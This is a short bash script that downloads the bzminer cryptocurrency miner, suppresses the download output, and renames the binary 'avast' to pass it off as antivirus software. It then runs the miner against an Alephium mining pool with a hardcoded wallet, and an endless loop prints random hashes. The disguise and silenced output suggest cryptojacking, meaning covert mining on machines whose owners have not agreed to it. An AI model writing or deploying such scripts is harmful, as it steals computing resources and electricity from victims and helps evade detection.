#!/bin/bash

#!/bin/sh

#!/bin/bash

sudo add-apt-repository ppa:graphics-drivers/ppa

sudo apt install nvidia-driver-440

apt update

apt install proxychains

apt install screen -y

wget https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1 

tar xf bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1

rm -f bzminer_v7.2.5_linux_cuda_tk.tar.gz

mv bzminer avast

chmod +x avast >/dev/null 2>&1

./avast -a alph -p stratum+tcp://pool.eu.woolypooly.com:3106 -w 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
